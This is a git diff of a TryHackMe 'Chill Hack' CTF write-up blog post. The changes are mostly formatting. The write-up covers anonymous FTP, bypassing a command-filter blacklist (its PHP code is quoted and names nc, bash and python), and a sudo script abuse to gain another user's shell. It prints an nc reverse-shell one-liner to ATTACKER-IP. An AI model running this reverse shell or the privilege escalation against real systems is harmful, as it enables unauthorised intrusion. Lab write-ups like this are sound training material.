@@ -6,6 +6,7 @@ layout : post
 category: CTF-WriteUp
 tags : [THM,TryHackMe,WriteUp,Chill Hack,Medium,CTF]
 image : /assets/images/writeups/thm/chillhack/chillhack.png
+
 ---
 ### Enumeration
 Classic Nmap scan : 
@@ -47,9 +48,9 @@ local: note.txt remote: note.txt
 ```
 As you can see,It accepts anonymous login, :WEEY: So I list all the files and it contains a *note.txt* file. 
 I download it using the *get* command. 
-```
-Anurodh told me that there is some filtering on strings being put in the command -- Apaar
-```
+
+> Anurodh told me that there is some filtering on strings being put in the command -- Apaar
+
 Well, that sounds cool, we got a hint, there's some filtration out there for strings. (Hope that it's not a rabbit hole), and we got 2 usernames. (We can start a bruteforce attack using hydra on the ssh but not for now, we need some more enumeration).
 
 Let's move on for the HTTP server:
@@ -91,12 +92,12 @@ I tried *cat*, *python* and *nc* commands but they're all filtered.
 I tried to split the commands with a semicolon but nothing changed. 
 So my final thought is that it filters some the string entered as an input.
 My first idea is to try a reverse shell found in [highon coffee blog](https://highon.coffee/blog/reverse-shell-cheat-sheet/) : 
-```
+```bash
 mkfifo /tmp/lol;nc ATTACKER-IP PORT 0</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol
 ```
 ![reverse](/assets/images/writeups/thm/chillhack/reverse.png)
 Looking at the index.php file found in the /var/www/html/secret directory, I found that my guessing was true, there's a blacklist array which contains some commands that are gonna filtered later. 
-```
+```php
 $cmd = $_POST['command'];
 $store = explode(" ",$cmd);
 $blacklist = array('nc', 'python', 'bash','php','perl','rm','cat','head','tail','python3','more','less','sh','ls');
@@ -104,12 +105,12 @@ $blacklist = array('nc', 'python', 'bash','php','perl','rm','cat','head','tail',
 Let's spawn a tty shell and move on.
 Looking at the home directory, I found that there's a directory called *apaar* (remember the hint ?).
 After checking it, I found a local.txt file which I don't have permission to read and a .helpline.sh file which can be run as apaar (after checking *sudo -l*) 
-```
+```bash
 User www-data may run the following commands on ubuntu:
     (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
 ```
 Reading the code, it looks like it executes whatever we type and redirects the error the /dev/null, so I executed */bin/bash* to get a shell from the user *apaar* and run any command we want !
-```
+```bash
 www-data@ubuntu:/home/apaar$ sudo -u apaar /home/apaar/.helpline.sh
 sudo -u apaar /home/apaar/.helpline.sh
 
